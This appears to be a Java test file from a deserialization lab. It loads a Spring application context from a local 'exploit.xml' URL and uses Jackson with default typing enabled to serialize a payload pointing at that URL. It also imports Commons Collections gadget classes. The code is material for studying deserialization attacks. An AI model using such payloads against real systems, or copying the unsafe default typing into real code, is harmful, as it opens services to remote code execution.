package com.deserialization.lab;

import com.deserialization.lab.model.APIMessage;
import com.deserialization.lab.model.Payload;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.springframework.context.support.FileSystemXmlApplicationContext;

import java.io.IOException;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws IOException {
        FileSystemXmlApplicationContext test = new FileSystemXmlApplicationContext("http://localhost:8000/exploit.xml");

        APIMessage response = new APIMessage(new Payload(new URL("http://localhost:8000/exploit.xml")), "API message!");

        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();

        objectMapper.writeValue(System.out, response);
    }
}
